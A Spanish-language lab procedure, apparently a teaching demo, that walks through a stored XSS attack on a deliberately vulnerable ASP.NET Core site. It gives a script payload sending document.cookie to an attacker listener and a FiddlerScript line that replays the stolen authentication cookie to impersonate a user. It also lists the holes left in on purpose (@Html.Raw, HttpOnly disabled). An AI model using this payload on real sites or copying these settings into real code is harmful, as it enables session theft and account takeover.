Procedimiento

1. Arrancamos el sitio web Server.
2. Ejecutamos la aplicación Attacker.
	- Arranca un listener HTTP para atender a las peticiones forzadas en el servidor, que recibirá y mostrará la solicitud de la víctima con la información confidencial.

3. Como usuario anónimo, en modo InPrivate, accedemos a Contact.
	- Introducimos en el campo vulnerable el siguiente código JavaScript: <script>image = new Image(); image.src='http://localhost:50666/hack/?cookie='+document.cookie;</script>
		
4. Nos autenticamos en la aplicación y accedemos a Contact.
	- Se captura la cookie de autenticación del usuario y se envía al atacante.
	
5. Arrancamos Fiddler y, en la pestaña FiddlerScript, modificamos el evento OnBeforeRequest para añadir la siguiente linea: oSession.oRequest["Cookie"] = (".AspNetCore.Identity.Application=XXX;" + oSession.oRequest["Cookie"])
	- El usuario anónimo suplanta la identidad del usuario autenticado, mientras Fiddler inyecte la cookie de autenticación en la solicitudes.
	
Información

+ Para el renderizado se utiliza el helper @Html.Raw dado que, de no permitir renderizar HTML, se codificaría para mostrarlo como texto y no se procesaría.
+ Se establece HttpOnly = false para la cookie de autenticación, o no podría ser accesible desde JavaScript.
